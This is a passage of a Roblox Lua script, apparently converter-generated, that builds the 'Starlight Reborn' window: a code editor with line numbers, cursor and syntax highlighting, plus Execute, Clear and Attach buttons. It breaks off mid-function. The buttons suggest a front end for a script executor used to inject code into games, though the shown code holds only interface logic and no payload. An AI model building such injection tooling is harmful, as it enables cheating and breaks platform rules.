-- 💫 Starlight Reborn
-- by: C:\Drive
-- version: 0.1.0


















































































































































local STAR = {};

--# StarterGui.Starlight Reborn
STAR["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
STAR["1"]["IgnoreGuiInset"] = true;
STAR["1"]["DisplayOrder"] = 1999999999;
STAR["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
STAR["1"]["Name"] = [[Starlight Reborn]];
STAR["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
STAR["1"]["ResetOnSpawn"] = false;


--# StarterGui.Starlight Reborn.MainFrame
STAR["2"] = Instance.new("Frame", STAR["1"]);
STAR["2"]["BorderSizePixel"] = 0;
STAR["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STAR["2"]["Size"] = UDim2.new(0, 550, 0, 350);
STAR["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
STAR["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["2"]["Name"] = [[MainFrame]];


--# StarterGui.Starlight Reborn.MainFrame.UICorner
STAR["3"] = Instance.new("UICorner", STAR["2"]);
STAR["3"]["CornerRadius"] = UDim.new(0, 12);


--# StarterGui.Starlight Reborn.MainFrame.Exit
STAR["4"] = Instance.new("Frame", STAR["2"]);
STAR["4"]["BorderSizePixel"] = 0;
STAR["4"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
STAR["4"]["Size"] = UDim2.new(0, 40, 0, 40);
STAR["4"]["Position"] = UDim2.new(1, -60, 0, 15);
STAR["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["4"]["Name"] = [[Exit]];


--# StarterGui.Starlight Reborn.MainFrame.Exit.UICorner
STAR["5"] = Instance.new("UICorner", STAR["4"]);
STAR["5"]["CornerRadius"] = UDim.new(0, 12);


--# StarterGui.Starlight Reborn.MainFrame.Exit.UIStroke
STAR["6"] = Instance.new("UIStroke", STAR["4"]);
STAR["6"]["Transparency"] = 0.51;
STAR["6"]["Color"] = Color3.fromRGB(145, 145, 145);


--# StarterGui.Starlight Reborn.MainFrame.Exit.X
STAR["7"] = Instance.new("ImageLabel", STAR["4"]);
STAR["7"]["BorderSizePixel"] = 0;
STAR["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
--# [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STAR["7"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STAR["7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STAR["7"]["Image"] = [[rbxassetid://12953907125]];
STAR["7"]["Size"] = UDim2.new(1, -10, 1, -10);
STAR["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["7"]["BackgroundTransparency"] = 1;
STAR["7"]["Name"] = [[X]];
STAR["7"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


--# StarterGui.Starlight Reborn.MainFrame.Exit.Button
STAR["8"] = Instance.new("TextButton", STAR["4"]);
STAR["8"]["BorderSizePixel"] = 0;
STAR["8"]["TextSize"] = 14;
STAR["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STAR["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STAR["8"]["BackgroundTransparency"] = 1;
STAR["8"]["Size"] = UDim2.new(1, 0, 1, 0);
STAR["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["8"]["Text"] = [[]];
STAR["8"]["Name"] = [[Button]];


--# StarterGui.Starlight Reborn.MainFrame.UIGradient
STAR["9"] = Instance.new("UIGradient", STAR["2"]);
STAR["9"]["Rotation"] = 90;
STAR["9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(39, 39, 39)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(25, 25, 25))};


--# StarterGui.Starlight Reborn.MainFrame.UIStroke
STAR["a"] = Instance.new("UIStroke", STAR["2"]);
STAR["a"]["Transparency"] = 0.51;
STAR["a"]["Color"] = Color3.fromRGB(145, 145, 145);


--# StarterGui.Starlight Reborn.MainFrame.Title
STAR["b"] = Instance.new("ImageLabel", STAR["2"]);
STAR["b"]["BorderSizePixel"] = 0;
STAR["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
--# [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STAR["b"]["Image"] = [[rbxassetid://138561242127995]];
STAR["b"]["Size"] = UDim2.new(0, 175, 0, 60);
STAR["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["b"]["BackgroundTransparency"] = 1;
STAR["b"]["Name"] = [[Title]];
STAR["b"]["Position"] = UDim2.new(0, 5, 0, 5);


--# StarterGui.Starlight Reborn.MainFrame.Title.StatusIcon
STAR["c"] = Instance.new("Frame", STAR["b"]);
STAR["c"]["BorderSizePixel"] = 0;
STAR["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["c"]["AnchorPoint"] = Vector2.new(0, 0.5);
STAR["c"]["Size"] = UDim2.new(0, 14, 0, 14);
STAR["c"]["Position"] = UDim2.new(1, 5, 0.5, 0);
STAR["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["c"]["Name"] = [[StatusIcon]];


--# StarterGui.Starlight Reborn.MainFrame.Title.StatusIcon.UICorner
STAR["d"] = Instance.new("UICorner", STAR["c"]);
STAR["d"]["CornerRadius"] = UDim.new(1, 0);


--# StarterGui.Starlight Reborn.MainFrame.Title.StatusIcon.UIGradient
STAR["e"] = Instance.new("UIGradient", STAR["c"]);
STAR["e"]["Rotation"] = 90;
STAR["e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 77, 77)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(182, 55, 55))};


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox
STAR["f"] = Instance.new("Frame", STAR["2"]);
STAR["f"]["BorderSizePixel"] = 0;
STAR["f"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
STAR["f"]["Size"] = UDim2.new(1, -32, 0, 225);
STAR["f"]["Position"] = UDim2.new(0, 15, 0, 70);
STAR["f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
STAR["f"]["Name"] = [[FastColoredTextbox]];


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll
STAR["10"] = Instance.new("ScrollingFrame", STAR["f"]);
STAR["10"]["Active"] = true;
STAR["10"]["ZIndex"] = 2;
STAR["10"]["BorderSizePixel"] = 0;
STAR["10"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
STAR["10"]["TopImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
STAR["10"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
STAR["10"]["Name"] = [[Scroll]];
STAR["10"]["BottomImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
STAR["10"]["Size"] = UDim2.new(1, 0, 1, 0);
STAR["10"]["ScrollBarImageColor3"] = Color3.fromRGB(43, 43, 43);
STAR["10"]["BorderColor3"] = Color3.fromRGB(127, 129, 126);
STAR["10"]["ScrollBarThickness"] = 16;
STAR["10"]["BackgroundTransparency"] = 1;


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.TextBox
STAR["11"] = Instance.new("TextBox", STAR["10"]);
STAR["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
STAR["11"]["BorderSizePixel"] = 0;
STAR["11"]["TextWrapped"] = true;
STAR["11"]["TextTransparency"] = 0.75;
STAR["11"]["TextSize"] = 15;
STAR["11"]["TextColor3"] = Color3.fromRGB(42, 42, 42);
STAR["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
STAR["11"]["BackgroundColor3"] = Color3.fromRGB(29, 35, 46);
STAR["11"]["RichText"] = true;
STAR["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STAR["11"]["MultiLine"] = true;
STAR["11"]["ClearTextOnFocus"] = false;
STAR["11"]["Size"] = UDim2.new(10, -27, 1, 0);
STAR["11"]["Position"] = UDim2.new(0, 20, 0, 0);
STAR["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["11"]["Text"] = [[]];
STAR["11"]["BackgroundTransparency"] = 1;


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.Highlighting
STAR["12"] = Instance.new("TextLabel", STAR["10"]);
STAR["12"]["TextWrapped"] = true;
STAR["12"]["BorderSizePixel"] = 0;
STAR["12"]["TextSize"] = 15;
STAR["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
STAR["12"]["TextYAlignment"] = Enum.TextYAlignment.Top;
STAR["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STAR["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STAR["12"]["BackgroundTransparency"] = 1;
STAR["12"]["RichText"] = true;
STAR["12"]["Size"] = UDim2.new(10, -27, 1, 0);
STAR["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["12"]["Text"] = [[]];
STAR["12"]["Name"] = [[Highlighting]];
STAR["12"]["Position"] = UDim2.new(0, 20, 0, 0);


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LineSelector
STAR["13"] = Instance.new("Frame", STAR["10"]);
STAR["13"]["ZIndex"] = -7;
STAR["13"]["BorderSizePixel"] = 0;
STAR["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["13"]["Size"] = UDim2.new(1, 0, 0, 15);
STAR["13"]["Position"] = UDim2.new(0, 20, 0, 0);
STAR["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["13"]["Name"] = [[LineSelector]];
STAR["13"]["BackgroundTransparency"] = 1;


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.Cursor
STAR["14"] = Instance.new("Frame", STAR["10"]);
STAR["14"]["BorderSizePixel"] = 0;
STAR["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["14"]["Size"] = UDim2.new(0, 1, 0, 15);
STAR["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["14"]["Name"] = [[Cursor]];


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.TextMeasurer
STAR["15"] = Instance.new("TextLabel", STAR["10"]);
STAR["15"]["BorderSizePixel"] = 0;
STAR["15"]["TextSize"] = 15;
STAR["15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
STAR["15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
STAR["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STAR["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STAR["15"]["BackgroundTransparency"] = 1;
STAR["15"]["RichText"] = true;
STAR["15"]["Size"] = UDim2.new(10, -27, 1, 0);
STAR["15"]["Visible"] = false;
STAR["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["15"]["Text"] = [[]];
STAR["15"]["Name"] = [[TextMeasurer]];
STAR["15"]["Position"] = UDim2.new(0, 20, 0, 0);


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesValue
STAR["16"] = Instance.new("NumberValue", STAR["10"]);
STAR["16"]["Name"] = [[LinesValue]];
STAR["16"]["Value"] = 1;


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesFrame
STAR["17"] = Instance.new("Frame", STAR["10"]);
STAR["17"]["BorderSizePixel"] = 0;
STAR["17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
STAR["17"]["Size"] = UDim2.new(0, 20, 17.91826, 0);
STAR["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["17"]["Name"] = [[LinesFrame]];
STAR["17"]["BackgroundTransparency"] = 0.85;


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesFrame.TextLabelTemplate
STAR["18"] = Instance.new("TextLabel", STAR["17"]);
STAR["18"]["TextWrapped"] = true;
STAR["18"]["BorderSizePixel"] = 0;
STAR["18"]["TextSize"] = 15;
STAR["18"]["TextScaled"] = true;
STAR["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STAR["18"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
STAR["18"]["BackgroundTransparency"] = 1;
STAR["18"]["Size"] = UDim2.new(0, 20, 0, 15);
STAR["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["18"]["Text"] = [[1]];
STAR["18"]["Name"] = [[TextLabelTemplate]];


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Scroll.LinesFrame.UIListLayout
STAR["19"] = Instance.new("UIListLayout", STAR["17"]);
STAR["19"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Handler
STAR["1a"] = Instance.new("LocalScript", STAR["f"]);
STAR["1a"]["Name"] = [[Handler]];


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.UICorner
STAR["1b"] = Instance.new("UICorner", STAR["f"]);
STAR["1b"]["CornerRadius"] = UDim.new(0, 12);


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.UIStroke
STAR["1c"] = Instance.new("UIStroke", STAR["f"]);
STAR["1c"]["Transparency"] = 0.51;
STAR["1c"]["Color"] = Color3.fromRGB(145, 145, 145);


--# StarterGui.Starlight Reborn.MainFrame.Execute
STAR["1d"] = Instance.new("Frame", STAR["2"]);
STAR["1d"]["BorderSizePixel"] = 0;
STAR["1d"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
STAR["1d"]["Size"] = UDim2.new(0, 40, 0, 40);
STAR["1d"]["Position"] = UDim2.new(0, 15, 0, 302);
STAR["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["1d"]["Name"] = [[Execute]];


--# StarterGui.Starlight Reborn.MainFrame.Execute.UIStroke
STAR["1e"] = Instance.new("UIStroke", STAR["1d"]);
STAR["1e"]["Transparency"] = 0.51;
STAR["1e"]["Color"] = Color3.fromRGB(145, 145, 145);


--# StarterGui.Starlight Reborn.MainFrame.Execute.X
STAR["1f"] = Instance.new("ImageLabel", STAR["1d"]);
STAR["1f"]["BorderSizePixel"] = 0;
STAR["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
--# [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STAR["1f"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STAR["1f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STAR["1f"]["Image"] = [[rbxassetid://7980684777]];
STAR["1f"]["Size"] = UDim2.new(1, -10, 1, -10);
STAR["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["1f"]["BackgroundTransparency"] = 1;
STAR["1f"]["Rotation"] = 90;
STAR["1f"]["Name"] = [[X]];
STAR["1f"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


--# StarterGui.Starlight Reborn.MainFrame.Execute.Button
STAR["20"] = Instance.new("TextButton", STAR["1d"]);
STAR["20"]["BorderSizePixel"] = 0;
STAR["20"]["TextSize"] = 14;
STAR["20"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STAR["20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STAR["20"]["BackgroundTransparency"] = 1;
STAR["20"]["Size"] = UDim2.new(1, 0, 1, 0);
STAR["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["20"]["Text"] = [[]];
STAR["20"]["Name"] = [[Button]];


--# StarterGui.Starlight Reborn.MainFrame.Execute.UICorner
STAR["21"] = Instance.new("UICorner", STAR["1d"]);
STAR["21"]["CornerRadius"] = UDim.new(0, 12);


--# StarterGui.Starlight Reborn.MainFrame.Clear
STAR["22"] = Instance.new("Frame", STAR["2"]);
STAR["22"]["BorderSizePixel"] = 0;
STAR["22"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
STAR["22"]["Size"] = UDim2.new(0, 40, 0, 40);
STAR["22"]["Position"] = UDim2.new(0, 65, 0, 302);
STAR["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["22"]["Name"] = [[Clear]];


--# StarterGui.Starlight Reborn.MainFrame.Clear.UIStroke
STAR["23"] = Instance.new("UIStroke", STAR["22"]);
STAR["23"]["Transparency"] = 0.51;
STAR["23"]["Color"] = Color3.fromRGB(145, 145, 145);


--# StarterGui.Starlight Reborn.MainFrame.Clear.X
STAR["24"] = Instance.new("ImageLabel", STAR["22"]);
STAR["24"]["BorderSizePixel"] = 0;
STAR["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
--# [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STAR["24"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STAR["24"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STAR["24"]["Image"] = [[rbxassetid://16346922164]];
STAR["24"]["Size"] = UDim2.new(1, -10, 1, -10);
STAR["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["24"]["BackgroundTransparency"] = 1;
STAR["24"]["Name"] = [[X]];
STAR["24"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


--# StarterGui.Starlight Reborn.MainFrame.Clear.Button
STAR["25"] = Instance.new("TextButton", STAR["22"]);
STAR["25"]["BorderSizePixel"] = 0;
STAR["25"]["TextSize"] = 14;
STAR["25"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STAR["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STAR["25"]["BackgroundTransparency"] = 1;
STAR["25"]["Size"] = UDim2.new(1, 0, 1, 0);
STAR["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["25"]["Text"] = [[]];
STAR["25"]["Name"] = [[Button]];


--# StarterGui.Starlight Reborn.MainFrame.Clear.UICorner
STAR["26"] = Instance.new("UICorner", STAR["22"]);
STAR["26"]["CornerRadius"] = UDim.new(0, 12);


--# StarterGui.Starlight Reborn.MainFrame.Attach
STAR["27"] = Instance.new("Frame", STAR["2"]);
STAR["27"]["BorderSizePixel"] = 0;
STAR["27"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
STAR["27"]["Size"] = UDim2.new(0, 40, 0, 40);
STAR["27"]["Position"] = UDim2.new(0, 492, 0, 302);
STAR["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["27"]["Name"] = [[Attach]];


--# StarterGui.Starlight Reborn.MainFrame.Attach.UIStroke
STAR["28"] = Instance.new("UIStroke", STAR["27"]);
STAR["28"]["Transparency"] = 0.51;
STAR["28"]["Color"] = Color3.fromRGB(145, 145, 145);


--# StarterGui.Starlight Reborn.MainFrame.Attach.X
STAR["29"] = Instance.new("ImageLabel", STAR["27"]);
STAR["29"]["BorderSizePixel"] = 0;
STAR["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
--# [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STAR["29"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STAR["29"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STAR["29"]["Image"] = [[rbxassetid://115736032752379]];
STAR["29"]["Size"] = UDim2.new(1, -15, 1, -15);
STAR["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["29"]["BackgroundTransparency"] = 1;
STAR["29"]["Rotation"] = 90;
STAR["29"]["Name"] = [[X]];
STAR["29"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


--# StarterGui.Starlight Reborn.MainFrame.Attach.Button
STAR["2a"] = Instance.new("TextButton", STAR["27"]);
STAR["2a"]["BorderSizePixel"] = 0;
STAR["2a"]["TextSize"] = 14;
STAR["2a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STAR["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STAR["2a"]["BackgroundTransparency"] = 1;
STAR["2a"]["Size"] = UDim2.new(1, 0, 1, 0);
STAR["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["2a"]["Text"] = [[]];
STAR["2a"]["Name"] = [[Button]];


--# StarterGui.Starlight Reborn.MainFrame.Attach.UICorner
STAR["2b"] = Instance.new("UICorner", STAR["27"]);
STAR["2b"]["CornerRadius"] = UDim.new(0, 12);


--# StarterGui.Starlight Reborn.MainFrame.UIDragDetector
STAR["2c"] = Instance.new("UIDragDetector", STAR["2"]);



--# StarterGui.Starlight Reborn.MainFrame.Handler
STAR["2d"] = Instance.new("LocalScript", STAR["2"]);
STAR["2d"]["Name"] = [[Handler]];


--# StarterGui.Starlight Reborn.MainFrame.Version
STAR["2e"] = Instance.new("TextLabel", STAR["2"]);
STAR["2e"]["BorderSizePixel"] = 0;
STAR["2e"]["TextSize"] = 32;
STAR["2e"]["TextXAlignment"] = Enum.TextXAlignment.Right;
STAR["2e"]["TextTransparency"] = 0.88;
STAR["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STAR["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STAR["2e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STAR["2e"]["BackgroundTransparency"] = 1;
STAR["2e"]["Size"] = UDim2.new(0, 70, 0, 40);
STAR["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STAR["2e"]["Text"] = [[0.1.0]];
STAR["2e"]["Name"] = [[Version]];
STAR["2e"]["Position"] = UDim2.new(0.73636, 5, 0.86, 2);


--# StarterGui.Starlight Reborn.MainFrame.FastColoredTextbox.Handler
local function C_1a()
local script = STAR["1a"];
	--## FastColoredTextBox v2 by: C:\Drive
	
	local fctbelements = {
		scroll = script.Parent.Scroll,
		textbox = script.Parent.Scroll.TextBox,
		cursor = script.Parent.Scroll.Cursor,
		selector = script.Parent.Scroll.LineSelector,
		lines = script.Parent.Scroll.LinesFrame,
		linetemp = script.Parent.Scroll.LinesFrame.TextLabelTemplate,
		highlighting = script.Parent.Scroll.Highlighting,
		measurer = script.Parent.Scroll.TextMeasurer,
		linesvalue = script.Parent.Scroll.LinesValue,
	}
	
	--## Automatic Scrolling (1/6)
	local scrollingframe = fctbelements.scroll
	local textbox = fctbelements.textbox
	local textservice = game:GetService("TextService")
	
	local function updatecanvassize()
		local textsize = textservice:GetTextSize(textbox.Text, textbox.TextSize, textbox.Font, Vector2.new(math.huge, math.huge))
		scrollingframe.CanvasSize = UDim2.new(0, textsize.X + 20, 0, textsize.Y + 10)
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(updatecanvassize)
	updatecanvassize()
	
	--## Line Checker (2/6)
	local textbox = fctbelements.textbox
	local linesvalue = fctbelements.linesvalue
	
	local function countlines(text)
		return select(2, text:gsub("\n", "\n")) + 1
	end
	
	local lastlinecount = countlines(textbox.Text)
	
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		local currentlinecount = countlines(textbox.Text)
		if currentlinecount ~= lastlinecount then
			linesvalue.Value += currentlinecount - lastlinecount
			lastlinecount = currentlinecount
		end
	end)
	
	--## Lines (3/6)
	local scrollingframe = fctbelements.scroll
	local frame = fctbelements.lines
	local template = fctbelements.linetemp
	local linesvalue = fctbelements.linesvalue
	
	local clones = {}
	local currentlinecount = 1
	
	linesvalue:GetPropertyChangedSignal("Value"):Connect(function()
		local newlinecount = linesvalue.Value
		if newlinecount > currentlinecount then
			for _ = 1, newlinecount - currentlinecount do
				local clone = template:Clone()
				clone.Visible = true
				clone.Text = tostring(#clones + 2)
				clone.Parent = frame
				table.insert(clones, clone)
			end
		elseif newlinecount < currentlinecount then
			for _ = 1, currentlinecount - newlinecount do
				local lastclone = table.remove(clones)
				if lastclone then lastclone:Destroy() end
			end
		end
		currentlinecount = newlinecount
	end)
	
	--## Cursor (4/6)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local cursorframe = fasttextbox:WaitForChild("Cursor")
	local measurer = fasttextbox:WaitForChild("TextMeasurer")
	local blinkinterval = 0.5
	local lineheight = textbox.TextSize
	
	cursorframe.Size = UDim2.new(0, 1, 0, lineheight)
	cursorframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	
	local function updatecursor()
		local cursorpos = textbox.CursorPosition
		if cursorpos <= 0 then
			cursorframe.Visible = false
			return
		end
		local textbeforecursor = textbox.Text:sub(1, cursorpos - 1)
		local linenumber = select(2, textbeforecursor:gsub("\n", "\n")) + 1
		local currentlinetext = textbeforecursor:match(".*()\n") and textbeforecursor:sub(textbeforecursor:match(".*()\n") + 1) or textbeforecursor
	
		measurer.Text = currentlinetext
		cursorframe.Position = UDim2.new(0, measurer.TextBounds.X + 20, 0, (linenumber - 1) * lineheight)
		cursorframe.Visible = true
	end
	
	local function blink()
		while true do
			cursorframe.Visible = not cursorframe.Visible
			wait(blinkinterval)
		end
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatecursor)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatecursor)
	spawn(blink)
	updatecursor()
	
	--## Selector (5/6)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local selector = fasttextbox:WaitForChild("LineSelector")
	local lineheight = textbox.TextSize
	selector.BackgroundTransparency = 0.85
	
	local tweenservice = game:GetService("TweenService")
	local tweeninfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local function updatelineselector()
		local cursor = textbox.CursorPosition
		if cursor <= 0 then
			selector.Visible = false
			return
		end
		local linenumber = select(2, textbox.Text:sub(1, cursor):gsub("\n", "\n")) + 1
		tweenservice:Create(selector, tweeninfo, {
			Position = UDim2.new(0, 20, 0, (linenumber - 1) * lineheight),
			Size = UDim2.new(1, 0, 0, lineheight),
		}):Play()
		selector.Visible = true
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatelineselector)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatelineselector)
	updatelineselector()
	
	--## Syntax Highlighting (6/6)
	local scrollingframe = fctbelements.scroll
	local textbox = scrollingframe:WaitForChild("TextBox")
	local highlightlabel = scrollingframe:WaitForChild("Highlighting")
	
	local keywords = {
		["and"] = "keyword", ["break"] = "keyword", ["do"] = "keyword",
		["else"] = "keyword", ["elseif"] = "keyword", ["end"] = "keyword",
		["false"] = "keyword", ["for"] = "keyword", ["function"] = "keyword",
		["if"] = "keyword", ["in"] = "keyword", ["local"] = "keyword",
		["nil"] = "keyword", ["not"] = "keyword", ["or"] = "keyword",
		["repeat"] = "keyword", ["return"] = "keyword", ["then"] = "keyword",
		["true"] = "keyword", ["until"] = "keyword", ["while"] = "keyword",
		["require"] = "function", ["goto"] = "keyword", ["self"] = "keyword",
		["print"] = "function", ["pairs"] = "function", ["ipairs"] = "function",
		["next"] = "function", ["tonumber"] = "function", ["tostring"] = "function",
		["type"] = "function", ["pcall"] = "function", ["xpcall"] = "function",
		["coroutine"] = "global", ["table"] = "global", ["string"] = "global",
		["math"] = "global", ["os"] = "global",
		["assert"] = "function", ["error"] = "function", ["rawget"] = "function",
		["rawset"] = "function",
		["game"] = "global", ["workspace"] = "global", ["script"] = "global",
		["Instance"] = "type", ["Vector3"] = "type", ["CFrame"] = "type",
		["Color3"] = "type", ["UDim2"] = "type", ["Enum"] = "type",
		["wait"] = "function", ["delay"] = "function", ["spawn"] = "function",
		["tick"] = "function", ["time"] = "function",
		["Vector2"] = "type", ["BrickColor"] = "type", ["Region3"] = "type",
		["Ray"] = "type", ["task"] = "global", ["RunService"] = "global",
		["UserInputService"] = "global",
	}
	
	local colormap = {
		keyword   = Color3.fromRGB(248, 109, 124),
		["function"] = Color3.fromRGB(132, 214, 247),
		["global"]   = Color3.fromRGB(132, 214, 247),
		["type"]     = Color3.fromRGB(132, 214, 247),
		string    = Color3.fromRGB(173, 241, 149),
		comment   = Color3.fromRGB(145, 145, 145),
		number    = Color3.fromRGB(255, 198, 0),
		operator  = Color3.fromRGB(200, 200, 200),
	}
	
	local function rgb(c)
		return math.floor(c.R * 255), math.floor(c.G * 255), math.floor(c.B * 255)
	end
	
	local function colored(text, kind)
		local c = colormap[kind]
		if not c then return text end
		local r,g,b = rgb(c)
